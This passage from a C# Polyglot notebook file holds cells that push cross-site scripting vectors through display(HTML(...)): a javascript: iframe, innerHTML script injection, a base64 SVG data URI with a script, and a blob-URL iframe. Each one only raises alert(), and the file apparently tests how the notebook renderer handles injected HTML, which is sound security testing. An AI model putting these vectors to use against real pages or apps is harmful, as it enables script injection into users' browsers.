    "display(HTML(\"<iframe src='javascript:parent.name=\\\"<script>alert('vector x2')</script>\\\"'></iframe>\"));\n",
    "\n",
    "\n",
    "var scriptContent = \"<script>alert('vector x3')</script>\";\n",
    "display(HTML(\"<div id='targetDiv'></div><script>document.getElementById('targetDiv').innerHTML = '\" + scriptContent + \"';</script>\"));\n",
    "\n",
    "var encodedSvg = Convert.ToBase64String(Encoding.UTF8.GetBytes(\"<svg xmlns='http://www.w3.org/2000/svg'><script>alert('vector x4')</script></svg>\"));\n",
    "display(HTML(\"<img src='data:image/svg+xml;base64,\" + encodedSvg + \"'>\"));"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "display(HTML(\"<script>var blob = new Blob(['<script>alert(\\\"vector x5\\\")<\\\\/script>'], {type: 'text/html'}); var url = URL.createObjectURL(blob); document.write('<iframe src=\\\"' + url + '\\\"></iframe>');</script>\"));\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "name": "python"
  },
  "polyglot_notebook": {
   "kernelInfo": {
    "defaultKernelName": "csharp",
    "items": [
     {
      "aliases": [],
      "name": "csharp"
     }
    ]
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
